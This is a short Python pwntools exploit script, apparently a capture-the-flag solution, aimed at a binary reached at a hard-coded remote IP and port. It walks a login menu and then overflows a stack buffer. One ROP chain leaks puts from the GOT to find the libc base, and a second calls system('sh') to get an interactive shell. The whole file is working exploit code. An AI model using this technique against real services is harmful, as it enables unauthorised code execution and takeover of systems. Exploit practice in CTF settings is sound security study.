from pwn import *

#p = process('./100')
p = remote('218.158.141.182',7853)
e = ELF('./100')
l = ELF('./libc.so.6')
pause()

context.log_level="debug"

p_r = 0x0000000000401313

idd = 'a' * 6
ps = 'a' * 15
n_name = 'a' * 0x10# + '30541989yisfrut'
main = 0x4011B4

def re_lo():
	p.recv()
	p.sendline('1')

	p.recv()
	p.sendline(idd)

	p.recv()
	p.sendline(ps)

	p.recv()
	p.sendline(ps)

	p.recv()
	p.sendline(n_name)

	p.recv()
	p.sendline('y')

	p.recv()
	p.sendline('y')

	p.recv()
	p.sendline(idd)

	p.recv()
	p.sendline(ps)

re_lo()

payload = 'a' * 0x63 + p64(0)+'aaaaa' + 'b' * 8
payload += p64(p_r)
payload += p64(e.got['puts'])
payload += p64(e.plt['puts'])
payload += p64(main)

p.recv()
p.sendline(payload)
p.recvuntil('bye\n')

libc = u64(p.recvuntil('\x7f').ljust(8,'\x00')) - l.sym['puts']
log.info('libc : ' + str(hex(libc)))

re_lo()

payload = 'a' * 0x63 + p64(0)+'aaaaa' + 'b' * 8
payload += p64(p_r)
payload += p64(libc + next(l.search('sh\x00')))
payload += p64(libc + l.sym['system'])

p.recv()
p.sendline(payload)
p.interactive()
